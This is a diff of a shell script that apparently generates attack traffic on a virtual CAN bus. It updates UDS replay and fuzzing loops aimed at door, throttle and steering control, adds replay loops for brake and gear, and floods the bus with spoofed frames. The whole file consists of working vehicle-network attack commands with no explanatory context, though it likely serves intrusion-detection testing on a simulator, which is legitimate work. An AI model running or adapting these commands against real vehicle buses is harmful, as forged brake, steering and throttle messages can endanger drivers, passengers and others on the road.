@@ -24,26 +24,30 @@ for cycle in {1..5}; do start=$(date +%s); while true; do now=$(date +%s); [[ $(
 for cycle in {1..5}; do start=$(date +%s); while true; do now=$(date +%s); [[ $((now - start)) -ge 5 ]] && break; cansend vcan0 000000C4#$(printf "%04X%04X%04X%04X" $RANDOM $RANDOM $RANDOM $RANDOM);sleep 0.2; done; sleep 5; done
 
 #UDS Replay on doors
-for cycle in {1..5}; do cansend vcan0 123#053101020364; sleep 5; cansend vcan0 123#053101020364; sleep 5; done
+for cycle in {1..5}; do cansend vcan0 7E0#053101020364; sleep 5; cansend vcan0 7E0#053101020364; sleep 5; done
 
 #UDS Replay on throttle
-for cycle in {1..5}; do cansend vcan0 123#05310101A964; sleep 5; cansend vcan0 123#05310201A964; sleep 5; done
+for cycle in {1..5}; do cansend vcan0 7E0#05310101A964; sleep 5; cansend vcan0 7E0#05310201A964; sleep 5; done
 
 #UDS Replay on steering
-for cycle in {1..5}; do cansend vcan0 123#05310104F15F; sleep 5; cansend vcan0 123#05310204F15F; sleep 5; done
+for cycle in {1..5}; do cansend vcan0 7E0#05310104F15F; sleep 5; cansend vcan0 7E0#05310204F15F; sleep 5; done
 
 #UDS Fuzzing on doors
-for cycle in {1..5}; do start=$(date +%s); while true; do now=$(date +%s); [[ $((now - start)) -ge 3 ]] && break; cansend vcan0 123#$(printf 0731010203"%02X%02X%02X" $((RANDOM % 256 )) $((RANDOM % 256 )) $((RANDOM % 256 ))); sleep 0.2; done; sleep 5; done; cansend vcan0 123#053101020364;
+for cycle in {1..5}; do start=$(date +%s); while true; do now=$(date +%s); [[ $((now - start)) -ge 3 ]] && break; cansend vcan0 7E0#$(printf 0731010203"%02X%02X%02X" $((RANDOM % 256 )) $((RANDOM % 256 )) $((RANDOM % 256 ))); sleep 0.2; done; sleep 5; done; cansend vcan0 7E0#053101020364;
 
 #UDS Fuzzing on throttle
-for cycle in {1..5}; do start=$(date +%s); while true; do now=$(date +%s); [[ $((now - start)) -ge 5 ]] && break; cansend vcan0 123#$(printf 07310101A9"%02X%02X%02X" $((RANDOM % 256 )) $((RANDOM % 256 )) $((RANDOM % 256 ))); sleep 0.2; done; sleep 5; done; cansend vcan0 123#05310201A964
+for cycle in {1..5}; do start=$(date +%s); while true; do now=$(date +%s); [[ $((now - start)) -ge 5 ]] && break; cansend vcan0 7E0#$(printf 07310101A9"%02X%02X%02X" $((RANDOM % 256 )) $((RANDOM % 256 )) $((RANDOM % 256 ))); sleep 0.2; done; sleep 5; done; cansend vcan0 7E0#05310201A964
 
 
 #UDS Fuzzing on steering
-sleep 3; for cycle in {1..5}; do start=$(date +%s); while true; do now=$(date +%s); [[ $((now - start)) -ge 5 ]] && break; cansend vcan0 123#$(printf 07310104F1"%02X%02X%02X" $((RANDOM % 256 )) $((RANDOM % 256 )) $((RANDOM % 256 ))); sleep 0.2; done; sleep 5; done; cansend vcan0 123#05310204F15F
+sleep 3; for cycle in {1..5}; do start=$(date +%s); while true; do now=$(date +%s); [[ $((now - start)) -ge 5 ]] && break; cansend vcan0 7E0#$(printf 07310104F1"%02X%02X%02X" $((RANDOM % 256 )) $((RANDOM % 256 )) $((RANDOM % 256 ))); sleep 0.2; done; sleep 5; done; cansend vcan0 7E0#05310204F15F
 
 
+#UDS Replay on brake
+for cycle in {1..5}; do cansend vcan0 7E0#053101020550; sleep 5; cansend vcan0 7E0#0431020205; sleep 5; done
 
+#UDS Replay on gear
+for cycle in {1..5}; do cansend vcan0 7E0#05310104F5FF; sleep 5; cansend vcan0 7E0#04310204F5; sleep 5; done
 
 while true; do cansend vcan0 000000C4#000000FF00000001; done
 
